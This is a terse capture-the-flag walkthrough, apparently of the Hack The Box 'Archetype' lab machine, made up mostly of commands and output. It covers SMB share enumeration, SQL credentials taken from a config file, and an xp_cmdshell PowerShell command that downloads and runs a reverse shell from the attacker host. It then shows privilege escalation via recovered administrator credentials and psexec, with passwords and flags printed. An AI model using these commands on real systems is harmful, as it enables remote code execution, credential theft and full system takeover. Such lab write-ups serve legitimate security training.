

```
nmap -sV -A -T4 10.129.179.20        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-22 07:37 -0400
Nmap scan report for 10.129.179.20
Host is up (0.27s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.179.20:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-07-22T11:37:48+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-22T11:32:23
|_Not valid after:  2056-07-22T11:32:23
| ms-sql-ntlm-info: 
|   10.129.179.20:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-22T04:37:33-07:00
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-22T11:37:37
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   269.69 ms 10.10.14.1
2   270.43 ms 10.129.179.20


```


```
smbclient -L 10.129.179.20                                                                  
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.179.20 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
  
```


```
 smbclient -L  ////10.129.179.20//ADMIN$ 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.179.20 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
   
```

```
smbclient \\\\10.129.179.20\\ADMIN$  
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

```
smbclient \\\\10.129.179.20\\backups
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2617644 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> 

```

Password=M3g4c0rp123


<img width="1914" height="283" alt="image" src="https://github.com/user-attachments/assets/c3aab7b8-4ffe-4916-85b0-838b8c8a5a31" />





```
impacket-mssqlclient sql_svc@10.129.179.20 -windows-auth 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (ARCHETYPE\sql_svc  dbo@master)> 

```

**xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\”http://10.10.14.205:8080/powershell-reverse-shell.ps1\”**
 	 	
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.205:8080/powershell-reverse-shell.ps1\")

<img width="1901" height="461" alt="image" src="https://github.com/user-attachments/assets/a3ea7f7e-c7d7-4df7-8c76-e07a7b551879" />


```
impacket-mssqlclient sql_svc@10.129.179.20 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.205:8080/powershell-reverse-shell.ps1\")
SQL (-@master)> 
```

```

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# nc -lvnp 9999                       
listening on [any] 9999 ...
connect to [10.10.14.205] from (UNKNOWN) [10.129.179.20] 50417
SHELL> 
```

<img width="941" height="421" alt="image" src="https://github.com/user-attachments/assets/bf6e12de-d263-40a8-aec5-bcd90543cc7f" />


user.txt=3e7b102e78218e935bf3f4951fec21a3
```
Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.14.205:8080/winPEASx64.exe" -OutFile "C:\Users\sql_svc\Desktop\winPEASx64.exe"
```

<img width="1453" height="415" alt="image" src="https://github.com/user-attachments/assets/9ec35763-b367-43f0-86ab-cf13e7987b0d" />

user:administrator MEGACORP_4dm1n!!


```
impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.179.20
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.179.20.....
[*] Found writable share ADMIN$
[*] Uploading file CPQbDlbe.exe
[*] Opening SVCManager on 10.129.179.20.....
[*] Creating service fuHh on 10.129.179.20.....
[*] Starting service fuHh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd ../../../users
 
C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
01/19/2020  11:39 PM    <DIR>          Administrator
01/19/2020  11:39 PM    <DIR>          Public
01/20/2020  06:01 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
               5 Dir(s)  10,709,229,568 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> cd Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,709,229,568 bytes free

C:\Users\Administrator\Desktop> cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
C:\Users\Administrator\Desktop> 

```

```
Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.14.205:8080/winPEASx64.exe" -OutFile "C:\Users\sql_svc\Desktop\winPEASx64.exe"
```

<img width="1910" height="772" alt="image" src="https://github.com/user-attachments/assets/f976bc75-7737-483d-b52e-dd74568ea33f" />



<img width="1873" height="406" alt="image" src="https://github.com/user-attachments/assets/87418560-8ee6-479e-a488-13c097141e9c" />




<img width="1132" height="600" alt="image" src="https://github.com/user-attachments/assets/d2754aa4-3962-4d1f-bd5d-f14cf34a52af" />








```
https://ludvikkristoffersen.medium.com/htb-starting-point-walkthrough-archetype-9ce989a79014
https://medium.com/@oparahreginaldcx7/tier-ii-archetype-htb-28e0ae0fe028

https://github.com/peass-ng/PEASS-ng/releases/tag/20240407-0335a42b
https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1

```


```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

